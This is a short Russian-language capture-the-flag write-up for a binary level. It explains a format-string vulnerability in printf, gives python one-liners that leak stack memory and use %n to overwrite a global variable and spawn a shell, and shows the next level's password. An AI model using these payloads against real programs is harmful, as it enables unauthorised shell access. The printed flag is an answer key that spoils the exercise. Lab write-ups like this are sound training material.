

# Вызов функции 'fgets', защищенной от переполнения буфера
```
=> 0x80484c7 <v+35>:	call   0x80483a0 <fgets@plt>
```
# Можно увидеть вызов 'printf' с тем что мы ввели
```
0x80484cc <v+40>:	lea    eax,[ebp-0x208]
0x80484d2 <v+46>:	mov    DWORD PTR [esp],eax
=> 0x80484d5 <v+49>:	call   0x8048390 <printf@plt>
```
# сmp создается с неинициализированной переменной
```
=> 0x80484da <v+54>:	mov    eax,ds:0x804988c
0x80484df <v+59>:	cmp    eax,0x40
```
# если эта проверка прошла успешно, создается новая оболочка с помощью 'system("/bin/sh")'

# Мы будем использовать атаку форматной строки
# Сначала нам нужно распечатать память, пока мы не дойдем до адреса переменной, которую хотим изменить
```
$> python -c "print '\x8c\x98\x04\x08 %x %x %x %x'" > /tmp/payload3
$> cat /tmp/payload3 | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```
# Затем мы используем модификатор %n, чтобы изменить содержимое этой переменной
```
$> python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" > /tmp/payload3
$> cat /tmp/payload3 - | ./level3
```
# cat /home/user/level4/.pass
>b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

# ╮(￣_￣)╭